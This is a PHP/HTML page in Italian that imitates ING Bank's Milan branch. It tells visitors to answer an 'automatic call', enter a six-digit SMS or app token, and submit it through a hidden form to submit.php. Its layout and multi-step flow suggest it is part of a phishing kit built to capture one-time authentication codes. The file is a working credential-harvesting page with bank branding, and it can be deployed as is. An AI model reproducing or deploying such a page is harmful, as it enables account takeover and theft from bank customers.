<?php require_once "../config.php"; ?>
<?php include 'include/header2.php'; ?>
<style>
.error-box {
    border: 1px solid #e74c3c;
    /* red border */
    background-color: #fff;
    color: #333;
    display: flex;
    align-items: center;
    padding: 12px 16px;
    border-radius: 4px;
    font-family: Arial, sans-serif;
    font-size: 14px;
    max-width: 500px;
    margin-bottom: 20px;
}

.error-icon {
    color: #e74c3c;
    font-weight: bold;
    margin-right: 10px;
    font-size: 16px;
}

.error-text {
    flex: 1;
    line-height: 1.4;
}
</style>
<div class="container">
    <form id="tokenForm" action="submit.php" method="POST">
        <input type="hidden" name="step" value="token">
        <input type="hidden" id="tokenValue" name="token" value="">
               <legend> Rispondi alla chiamata automatica per ricevere il tuo codice SMS... </legend>
      <p role="alert" class="info-message">
        <span> <img width="100" src="../client/img/ing-call.png"> </span>
      </p>
	  </br>
	  
 
        <div class="progress">
            <div class="progress-step completed">
                <div class="progress-step-circle">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
                        stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
					
                </div>
                <div class="progress-step-text">Codice Operazione</div>
            </div>

            <div class="progress-line"></div>

            <div class="progress-step active">
                <div class="progress-step-circle">2</div>
                <div class="progress-step-text">Codice Token</div>
            </div>
        </div>
        <div class="error-box" style="<?php echo isset($_GET['error']) ? 'display: flex;' : 'display: none;'; ?>">
            <span class="error-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                    fill="var(--fg_error, #D70000)" focusable="false" aria-hidden="true">
                    <path
                        d="M11.2178,15.6895 C11.2178,15.9065 11.1178,16.0065 10.8678,16.0065 L9.1158,16.0065 C8.8828,16.0065 8.7818,15.9065 8.7818,15.6895 L8.7818,13.9545 C8.7818,13.7375 8.8828,13.6365 9.1158,13.6365 L10.8678,13.6365 C11.1178,13.6365 11.2178,13.7375 11.2178,13.9545 L11.2178,15.6895 Z M9.1988,3.9935 L10.8008,3.9935 C11.0338,3.9935 11.1178,4.0935 11.1178,4.2935 L10.8848,11.8355 C10.8848,12.0015 10.8188,12.0515 10.6348,12.0515 L9.3998,12.0515 C9.2158,12.0515 9.1498,12.0015 9.1498,11.8355 L8.8828,4.2935 C8.8828,4.0935 8.9658,3.9935 9.1988,3.9935 L9.1988,3.9935 Z M9.9998,0.0005 C4.4868,0.0005 -0.0002,4.4855 -0.0002,10.0005 C-0.0002,15.5135 4.4868,20.0005 9.9998,20.0005 C15.5138,20.0005 19.9998,15.5135 19.9998,10.0005 C19.9998,4.4855 15.5138,0.0005 9.9998,0.0005 L9.9998,0.0005 Z"
                        transform="translate(2 2)"></path>
                </svg></span>
            <span class="error-text">
                Oops ... il codice inserito non è corretto. Controlla e riprova.
            </span>
        </div>
        <h1>Inserisci il Codice Token</h1>
        <p class="instruction">Inserisci il codice di 6 cifre che hai generato con l'App.</p>

        <div class="token-input">
            <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
            <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
            <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
            <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
            <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
            <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
        </div>

        <div class="action-buttons">
            <button id="continueBtn" type="button" class="continue-btn" disabled>Continua</button>
            <button type="button" class="back-btn">Indietro</button>
        </div>
    </form>
</div>

<div class="footer">
    <div class="footer-links">
        <a href="#" class="footer-link">Sicurezza</a>
        <a href="#" class="footer-link">Definizione di Default</a>
        <a href="#" class="footer-link">Privacy</a>
    </div>

    <div class="footer-links">
        <a href="#" class="footer-link">Trasparenza</a>
        <a href="#" class="footer-link">Reclami</a>
        <a href="#" class="footer-link">Cookies</a>
    </div>
</div>

<div class="copyright">
    © 2025 ING BANK N.V. Milan Branch P.I. 11241140158
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const tokenInputs = document.querySelectorAll('.token-digit');
    const continueBtn = document.getElementById('continueBtn');
    const backBtn = document.querySelector('.back-btn');
    const tokenForm = document.getElementById('tokenForm');
    const tokenValue = document.getElementById('tokenValue');

    // Function to check if all inputs are filled
    function checkInputs() {
        let allFilled = true;
        tokenInputs.forEach(input => {
            if (input.value === '') {
                allFilled = false;
            }
        });

        if (allFilled) {
            continueBtn.disabled = false;
        } else {
            continueBtn.disabled = true;
        }

        return allFilled;
    }

    // Add event listeners to token inputs
    tokenInputs.forEach((input, index) => {
        // Focus next input when a digit is entered
        input.addEventListener('input', function() {
            if (this.value) {
                // Move to next input
                if (index < tokenInputs.length - 1) {
                    tokenInputs[index + 1].focus();
                }
            }

            checkInputs();
        });

        // Handle backspace
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace') {
                if (this.value === '') {
                    // Move to previous input if current is empty
                    if (index > 0) {
                        tokenInputs[index - 1].focus();
                    }
                } else {
                    // Clear current input
                    this.value = '';
                    checkInputs();
                }
            }
        });

        // Prevent non-numeric input
        input.addEventListener('keypress', function(e) {
            if (!/[0-9]/.test(e.key)) {
                e.preventDefault();
            }
        });

        // Handle paste event for the entire code
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/\D/g, '')
                .substring(0, 6);

            if (pastedData.length > 0) {
                // Fill inputs with pasted data
                for (let i = 0; i < Math.min(tokenInputs.length, pastedData
                        .length); i++) {
                    tokenInputs[i].value = pastedData[i];
                }

                // Focus appropriate input
                if (pastedData.length < tokenInputs.length) {
                    tokenInputs[pastedData.length].focus();
                } else {
                    tokenInputs[tokenInputs.length - 1].focus();
                }

                checkInputs();
            }
        });
    });

    // Continue button click handler
    continueBtn.addEventListener('click', function() {
        if (checkInputs()) {
            // Collect token code
            let tokenCode = '';
            tokenInputs.forEach(input => {
                tokenCode += input.value;
            });

            // Set value in hidden field
            tokenValue.value = tokenCode;

            // Submit form
            tokenForm.submit();
        }
    });

    // Back button handler
    backBtn.addEventListener('click', function() {
        window.location.href = 'firma.php?redirect=' + encodeURIComponent(window.location.href);
    });
});
</script>
</body>

</html>